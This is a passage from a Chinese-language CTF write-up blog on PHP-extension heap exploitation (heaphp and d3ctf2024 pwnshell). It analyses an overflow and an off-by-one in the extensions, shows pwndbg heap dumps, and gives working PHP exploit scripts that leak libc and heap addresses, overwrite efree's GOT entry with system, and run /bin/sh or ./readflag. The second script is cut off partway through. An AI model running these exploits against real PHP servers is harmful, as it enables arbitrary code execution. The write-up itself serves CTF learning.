(deepunk.icu)</a></p><p>给了一个heaphp.so文件,应该就是存在漏洞的拓展文件</p><p>保护基本全开,除了Partial RELRO</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/heaphp/src/stuff/heaphp.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>这题甚至保留了note结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> note struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, align=<span class="number">0x8</span>, copyof_166)</span><br><span class="line"><span class="number">00000000</span> title db <span class="number">32</span> dup(?)</span><br><span class="line"><span class="number">00000020</span> size dq ?</span><br><span class="line"><span class="number">00000028</span> content dq ?                            ; offset</span><br><span class="line"><span class="number">00000030</span> note ends</span><br></pre></td></tr></table></figure><p>因为是复现就不把所有函数都分析出来了</p><p>漏洞出在<code>zif_add_node</code>,创建一个新的note的时候会需要两个字符串参数,第一个作为note而当title,第二个作为note的content,并且只检测了第一个字符串的长度,第二个字符串是使用string结构描述符中的真实长度</p><p>十分关键的就是复制字符串2到note-&gt;content时使用的是memcpy</p><p>而申请content时却又是根据strlen来申请大小</p><p>这意味着如果这个字符串被<code>\0</code>截断那么最终复制的str2会发生溢出</p><p>那么就可以覆盖下一个堆块的fd指针,从而做到任意地址分配</p><p>通过覆盖任意笔记的内容指针，我们可以通过 <code>zif_view_note</code> 获取任意地址的内容。</p><p><strong>exp:</strong></p><p>真正调用时函数名字不需要前面的<code>zif_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function mychr($index)&#123;</span></span><br><span class="line"><span class="comment">// return [&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27;\x7f&#x27;, &#x27;\x80&#x27;, &#x27;\x81&#x27;, &#x27;\x82&#x27;, &#x27;\x83&#x27;, &#x27;\x84&#x27;, &#x27;\x85&#x27;, &#x27;\x86&#x27;, &#x27;\x87&#x27;, &#x27;\x88&#x27;, &#x27;\x89&#x27;, &#x27;\x8a&#x27;, &#x27;\x8b&#x27;, &#x27;\x8c&#x27;, &#x27;\x8d&#x27;, &#x27;\x8e&#x27;, &#x27;\x8f&#x27;, &#x27;\x90&#x27;, &#x27;\x91&#x27;, &#x27;\x92&#x27;, &#x27;\x93&#x27;, &#x27;\x94&#x27;, &#x27;\x95&#x27;, &#x27;\x96&#x27;, &#x27;\x97&#x27;, &#x27;\x98&#x27;, &#x27;\x99&#x27;, &#x27;\x9a&#x27;, &#x27;\x9b&#x27;, &#x27;\x9c&#x27;, &#x27;\x9d&#x27;, &#x27;\x9e&#x27;, &#x27;\x9f&#x27;, &#x27;\xa0&#x27;, &#x27;¡&#x27;, &#x27;¢&#x27;, &#x27;£&#x27;, &#x27;¤&#x27;, &#x27;¥&#x27;, &#x27;¦&#x27;, &#x27;§&#x27;, &#x27;¨&#x27;, &#x27;©&#x27;, &#x27;ª&#x27;, &#x27;«&#x27;, &#x27;¬&#x27;, &#x27;\xad&#x27;, &#x27;®&#x27;, &#x27;¯&#x27;, &#x27;°&#x27;, &#x27;±&#x27;, &#x27;²&#x27;, &#x27;³&#x27;, &#x27;´&#x27;, &#x27;µ&#x27;, &#x27;¶&#x27;, &#x27;·&#x27;, &#x27;¸&#x27;, &#x27;¹&#x27;, &#x27;º&#x27;, &#x27;»&#x27;, &#x27;¼&#x27;, &#x27;½&#x27;, &#x27;¾&#x27;, &#x27;¿&#x27;, &#x27;À&#x27;, &#x27;Á&#x27;, &#x27;Â&#x27;, &#x27;Ã&#x27;, &#x27;Ä&#x27;, &#x27;Å&#x27;, &#x27;Æ&#x27;, &#x27;Ç&#x27;, &#x27;È&#x27;, &#x27;É&#x27;, &#x27;Ê&#x27;, &#x27;Ë&#x27;, &#x27;Ì&#x27;, &#x27;Í&#x27;, &#x27;Î&#x27;, &#x27;Ï&#x27;, &#x27;Ð&#x27;, &#x27;Ñ&#x27;, &#x27;Ò&#x27;, &#x27;Ó&#x27;, &#x27;Ô&#x27;, &#x27;Õ&#x27;, &#x27;Ö&#x27;, &#x27;×&#x27;, &#x27;Ø&#x27;, &#x27;Ù&#x27;, &#x27;Ú&#x27;, &#x27;Û&#x27;, &#x27;Ü&#x27;, &#x27;Ý&#x27;, &#x27;Þ&#x27;, &#x27;ß&#x27;, &#x27;à&#x27;, &#x27;á&#x27;, &#x27;â&#x27;, &#x27;ã&#x27;, &#x27;ä&#x27;, &#x27;å&#x27;, &#x27;æ&#x27;, &#x27;ç&#x27;, &#x27;è&#x27;, &#x27;é&#x27;, &#x27;ê&#x27;, &#x27;ë&#x27;, &#x27;ì&#x27;, &#x27;í&#x27;, &#x27;î&#x27;, &#x27;ï&#x27;, &#x27;ð&#x27;, &#x27;ñ&#x27;, &#x27;ò&#x27;, &#x27;ó&#x27;, &#x27;ô&#x27;, &#x27;õ&#x27;, &#x27;ö&#x27;, &#x27;÷&#x27;, &#x27;ø&#x27;, &#x27;ù&#x27;, &#x27;ú&#x27;, &#x27;û&#x27;, &#x27;ü&#x27;, &#x27;ý&#x27;, &#x27;þ&#x27;, &#x27;ÿ&#x27;][$index];</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tobytes</span>(<span class="params"><span class="variable">$integerValue</span>, <span class="variable">$byteLength</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$byteString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$byteLength</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byteString</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$integerValue</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$integerValue</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$byteString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number1&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00/bin/shacaaadaaaeaaafaaagaaahaaaiaaajaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fd</span>=<span class="title function_ invoke__">list_note</span>();</span><br><span class="line"><span class="variable">$fd</span> = <span class="variable">$fd</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$decimalValue</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">6</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$fd</span>[-<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$decimalValue</span> = (<span class="variable">$decimalValue</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="variable">$decimalValue</span> - <span class="number">0x1480</span>;</span><br><span class="line"><span class="variable">$target_libc</span> = <span class="variable">$heap_base</span> + <span class="number">0x82000</span>; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$target_libc</span>,<span class="number">8</span>));</span><br><span class="line"><span class="variable">$libc_off</span> = <span class="title function_ invoke__">view_note</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$libc</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">5</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$libc_off</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$libc</span> = (<span class="variable">$libc</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$libc</span> -= <span class="number">0x219aa0</span>;</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;%x&quot;</span>,<span class="variable">$libc</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$heaphp_base</span> = <span class="variable">$libc</span> + <span class="number">0x7af000</span>;</span><br><span class="line"><span class="variable">$sys_addr</span> = <span class="variable">$libc</span> + <span class="number">0x50d60</span>;</span><br><span class="line"><span class="variable">$efree_got_addr</span> = <span class="variable">$heaphp_base</span> + <span class="number">0x4058</span>;</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$efree_got_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;./readflag&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">edit_note</span>(<span class="number">1</span>,<span class="title function_ invoke__">tobytes</span>(<span class="variable">$sys_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phppwn是没办法直接交互的,所以最终必须要想办法拿到flag,可以重定向到某个新文件,或者反弹shell</p><h2 id="d3ctf2024-pwnshell"><a href="#d3ctf2024-pwnshell" class="headerlink" title="d3ctf2024-pwnshell"></a>d3ctf2024-pwnshell</h2><p>热乎的题目</p><p>note的结构大致如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> node struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x8</span>, copyof_8, variable size)</span><br><span class="line"><span class="number">00000000</span> ptr dq ?                                ; offset</span><br><span class="line"><span class="number">00000008</span> len dq ?</span><br><span class="line"><span class="number">00000010</span> des db <span class="number">0</span> dup(?)</span><br><span class="line"><span class="number">00000010</span> node ends</span><br></pre></td></tr></table></figure><p>chunklist的结构大致如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">list</span> struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x8</span>, copyof_9)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: .bss:chunkList/r</span><br><span class="line"><span class="number">00000000</span> ptr dq ?                                ; offset</span><br><span class="line"><span class="number">00000008</span> inuse dd ?</span><br><span class="line"><span class="number">0000000</span>C db ? ; undefined</span><br><span class="line"><span class="number">0000000</span>D db ? ; undefined</span><br><span class="line"><span class="number">0000000</span>E db ? ; undefined</span><br><span class="line"><span class="number">0000000F</span> db ? ; undefined</span><br><span class="line"><span class="number">00000010</span> <span class="built_in">list</span> ends</span><br></pre></td></tr></table></figure><p>在addHacker中存在off-by-one</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v15[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; v14[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      p_inuse = &amp;chunkList[<span class="number">0</span>].inuse;</span><br><span class="line">      <span class="keyword">while</span> ( *(_BYTE *)p_inuse != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        p_inuse += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">16</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v5;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v7 = &amp;chunkList[v2];</span><br><span class="line">      v8 = (node *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">16LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">      v9 = (<span class="type">char</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">16LL</span>));</span><br><span class="line">      v8-&gt;ptr = v9;</span><br><span class="line">      v10 = *(_QWORD *)(*(_QWORD *)v15 + <span class="number">16LL</span>);</span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v15 + <span class="number">24LL</span>);</span><br><span class="line">      v8-&gt;len = v10;</span><br><span class="line">      <span class="built_in">memcpy</span>(v9, v11, v10);</span><br><span class="line">      v12 = v14;</span><br><span class="line">      <span class="built_in">memcpy</span>(v8-&gt;des, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v14 + <span class="number">24LL</span>), *(_QWORD *)(*(_QWORD *)v14 + <span class="number">16LL</span>));</span><br><span class="line">      v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">16LL</span>);</span><br><span class="line">      v7-&gt;ptr = (<span class="type">char</span> *)v8;</span><br><span class="line">      v7-&gt;inuse = <span class="number">13</span>;</span><br><span class="line">      v8-&gt;des[v13] = <span class="number">0</span>;<span class="comment">//off-by-one</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>off-by-one在zendmm分配器情况下是十分危险的,因为一个page所有的空闲块都会在链上,且没有random_list和hardend_list这样的保护</p><p>完全是裸的出现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff5400000</span> <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff5400000</span> —▸ <span class="number">0x7ffff5400040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff5400008</span> —▸ <span class="number">0x7ffff5400000</span> —▸ <span class="number">0x7ffff5400040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff5400010</span> —▸ <span class="number">0x7ffff5400000</span> —▸ <span class="number">0x7ffff5400040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffff5400018</span> ◂— <span class="number">0x9300000175</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffff5400020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">5</span> skipped</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7ffff5400050</span> ◂— <span class="number">0x617d8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7ffff5400058</span> ◂— <span class="number">0x6a1d8</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7ffff5400060</span> —▸ <span class="number">0x7ffff548d018</span> —▸ <span class="number">0x7ffff548d020</span> —▸ <span class="number">0x7ffff548d028</span> —▸ <span class="number">0x7ffff548d030</span> ◂— ...</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7ffff5400068</span> —▸ <span class="number">0x7ffff5482040</span> —▸ <span class="number">0x7ffff5482050</span> —▸ <span class="number">0x7ffff5482060</span> —▸ <span class="number">0x7ffff5482070</span> ◂— ...</span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7ffff5400070</span> —▸ <span class="number">0x7ffff54010a8</span> —▸ <span class="number">0x7ffff54010c0</span> —▸ <span class="number">0x7ffff54010d8</span> —▸ <span class="number">0x7ffff54010f0</span> ◂— ...</span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x7ffff5400078</span> —▸ <span class="number">0x7ffff54026c0</span> —▸ <span class="number">0x7ffff54026e0</span> —▸ <span class="number">0x7ffff5402700</span> —▸ <span class="number">0x7ffff5402780</span> ◂— ...</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x7ffff5400080</span> —▸ <span class="number">0x7ffff54687a8</span> —▸ <span class="number">0x7ffff54687d0</span> —▸ <span class="number">0x7ffff54687f8</span> —▸ <span class="number">0x7ffff5468820</span> ◂— ...</span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x7ffff5400088</span> —▸ <span class="number">0x7ffff545d330</span> —▸ <span class="number">0x7ffff545d360</span> —▸ <span class="number">0x7ffff545d390</span> —▸ <span class="number">0x7ffff545d3c0</span> ◂— ...</span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x7ffff5400090</span> —▸ <span class="number">0x7ffff54563f0</span> —▸ <span class="number">0x7ffff5456428</span> —▸ <span class="number">0x7ffff5456460</span> —▸ <span class="number">0x7ffff5456498</span> ◂— ...</span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x7ffff5400098</span> —▸ <span class="number">0x7ffff5473100</span> —▸ <span class="number">0x7ffff5473140</span> —▸ <span class="number">0x7ffff5473180</span> —▸ <span class="number">0x7ffff54731c0</span> ◂— ...</span><br></pre></td></tr></table></figure><p>特别注意到0x40的链,其第一个空闲chunkA的地址是00结尾,那么如果使用他来off-by-one则直接可以使得下下个分配出来的chunk又是A</p><p><strong>利用:</strong></p><ol><li>分配一个0x40的chunkA,并触发off-by-one</li><li>分配两个0x40的chunk,第二个会覆盖A的ptr指针,写入目标指针</li><li>修改chunkA-&gt;content的内容,实现任意写,这里选择修改_efree的got表为system</li><li>新增一个以需要执行命令为开头的chunk,并删除</li></ol><p>利用比较简单,几乎没有费脑的地方</p><p><strong>exp:</strong></p><p>这里选择直接包含<code>/proc/self/maps</code>来获取各种基址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$libc</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64</span>(<span class="params"><span class="variable">$leak</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$addr</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">str_pad</span>(<span class="variable">$addr</span>, <span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span 